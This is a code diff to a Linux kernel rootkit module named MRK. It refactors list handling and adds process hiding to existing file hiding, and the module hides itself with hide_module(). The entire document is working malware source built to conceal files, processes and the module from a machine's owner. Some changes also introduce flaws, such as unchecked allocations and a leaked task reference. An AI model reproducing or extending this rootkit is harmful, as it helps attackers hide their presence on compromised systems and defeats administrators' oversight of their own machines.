@@ -81,12 +81,10 @@ static int create_fops_hook(struct inode *inode, struct file_operations **file_o
 }
 
 static int free_fops_hook(struct inode *inode) {
-    struct list_head *pos;
     struct fops_hook *entry;
     unsigned int refcount;
 
-	list_for_each(pos, &fops_hooks) {
-	    entry = list_entry(pos, struct fops_hook, head);
+	list_for_each_entry(entry, &fops_hooks, head) {
 	    if (entry->ino == inode->i_ino) {
             refcount = --(entry->refcount);
             if (refcount) return 0;
@@ -101,10 +99,8 @@ static int free_fops_hook(struct inode *inode) {
 }
 
 static struct fops_hook *get_fops_hook(const struct inode *inode) {
-    struct list_head *pos;
     struct fops_hook *entry;
-	list_for_each(pos, &fops_hooks) {
-	    entry = list_entry(pos, struct fops_hook, head);
+	list_for_each_entry(entry, &fops_hooks, head) {
 	    if (entry->ino == inode->i_ino) {
 	        return entry;
 	    }
@@ -114,7 +110,9 @@ static struct fops_hook *get_fops_hook(const struct inode *inode) {
 
 struct hidden_file_entry {
     struct list_head head;
+    // parent directory inode number
     unsigned long ino;
+    // file name
     char *file_name;
 };
 
@@ -136,10 +134,9 @@ static int create_hidden_file_entry(const struct inode *inode, const char *file_
 }
 
 static int free_hidden_file_entry(const struct inode *inode, const char *file_name) {
-    struct list_head *pos;
     struct hidden_file_entry *entry;
-	list_for_each(pos, &hidden_files) {
-	    entry = list_entry(pos, struct hidden_file_entry, head);
+
+	list_for_each_entry(entry, &hidden_files, head) {
 	    if (entry->ino == inode->i_ino && !strcmp(entry->file_name, file_name)) {
 	        kfree(entry->file_name);
 	        list_del(&entry->head);
@@ -149,6 +146,49 @@ static int free_hidden_file_entry(const struct inode *inode, const char *file_na
 	}
 	return -1;
 }
+
+struct hidden_process_entry {
+    struct list_head head;
+    unsigned long exe_file_ino;
+};
+
+static LIST_HEAD(hidden_processes);
+
+static int create_hidden_process_entry(const char *exe_file_name) {
+    int retval;
+    struct inode *inode;
+	struct hidden_process_entry *hidden_process;
+
+    if ((retval = get_inode_by_path_name(exe_file_name, &inode))) {
+	    return retval;
+	}
+
+	hidden_process = (struct hidden_process_entry *)kmalloc(sizeof(struct hidden_process_entry), GFP_KERNEL);
+	hidden_process->exe_file_ino = inode->i_ino;
+
+	list_add(&hidden_process->head, &hidden_processes);
+	return 0;
+}
+
+static int free_hidden_process_entry(const char *exe_file_name) {
+    int retval;
+    struct inode *inode;
+    struct hidden_process_entry *entry;
+
+    if ((retval = get_inode_by_path_name(exe_file_name, &inode))) {
+	    return retval;
+	}
+
+	list_for_each_entry(entry, &hidden_processes, head) {
+	    if (entry->exe_file_ino == inode->i_ino) {
+	        list_del(&entry->head);
+	        kfree(entry);
+	        return 0;
+	    }
+	}
+	return -1;
+}
+
 
 struct hooked_dir_context {
     struct list_head head;
@@ -160,17 +200,13 @@ struct hooked_dir_context {
 static LIST_HEAD(hooked_dir_context_list);
 
 static int new_actor(struct dir_context *ctx, const char *name, int namelen, loff_t off, u64 ino, unsigned type) {
-    struct list_head *pos;
-    struct list_head *file_pos;
     struct hooked_dir_context *entry;
     struct hidden_file_entry *hidden_file;
 
-	list_for_each(pos, &hooked_dir_context_list) {
-	    entry = list_entry(pos, struct hooked_dir_context, head);
+	list_for_each_entry(entry, &hooked_dir_context_list, head) {
 	    if (entry->ctx == ctx) {
 	    	printk(KERN_INFO "Called hooked actor! %s", name);
-	        list_for_each(file_pos, &hidden_files) {
-	            hidden_file = list_entry(file_pos, struct hidden_file_entry, head);
+	        list_for_each_entry(hidden_file, &hidden_files, head) {
                 if (hidden_file->ino == entry->ino && !strcmp(name, hidden_file->file_name)) {
                     return 0;
                 }
@@ -271,20 +307,16 @@ static int unhide_file(const char *path_name) {
 static unsigned long get_exec_ino_by_pid(int pid) {
     struct pid *pid_struct;
     struct task_struct *task_struct;
-    char task_comm[16];
-    unsigned long result = 0;
+    unsigned long result;
 
     pid_struct = find_get_pid(pid);
     task_struct = get_pid_task(pid_struct,  PIDTYPE_PID);
-    get_task_comm(task_comm, task_struct);
 
-    printk(KERN_INFO "task %d comm: %s", pid, task_comm);
-    // TODO: handle errors
-    if (task_struct->mm && task_struct->mm->exe_file) {
-        printk(KERN_INFO "task exe inode num: %lu", task_struct->mm->exe_file->f_inode->i_ino);
-        result = task_struct->mm->exe_file->f_inode->i_ino;
+    if (!task_struct->mm || !task_struct->mm->exe_file) {
+        return 0;
     }
 
+    result = task_struct->mm->exe_file->f_inode->i_ino;
     put_task_struct(task_struct);
     put_pid(pid_struct);
     return result;
@@ -305,7 +337,7 @@ static int __init MRK_initialize(void) {
 	unhide_file(test_path_name2);
 	get_exec_ino_by_pid(2609);
 //	hide_file("/proc/22");
-//  printk(KERN_INFO "%d", pid_matches_exec_path_name(2609, "/bin/ps"));
+  printk(KERN_INFO "%d", pid_matches_exec_path_name(2609, "/bin/ps"));
 	hide_module();
 	printk(KERN_INFO "Hello, World!\n");
 	return 0;
